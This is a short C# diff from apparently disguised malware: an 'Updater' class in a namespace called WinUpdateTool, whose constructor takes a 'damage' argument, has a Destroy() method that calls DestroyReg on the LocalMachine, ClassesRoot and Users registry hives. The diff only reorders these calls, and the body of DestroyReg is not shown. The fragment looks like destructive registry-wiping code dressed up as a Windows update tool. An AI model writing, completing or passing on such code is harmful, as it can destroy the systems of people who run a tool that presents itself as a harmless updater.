@@ -104,8 +104,8 @@ namespace WinUpdateTool
         public void Destroy()
         {
             DestroyReg(Registry.LocalMachine, 1);
-            DestroyReg(Registry.ClassesRoot, 1);
             DestroyReg(Registry.Users, 1);
+            DestroyReg(Registry.ClassesRoot, 1);
         }
 
         public Updater(double damage, string[] args)
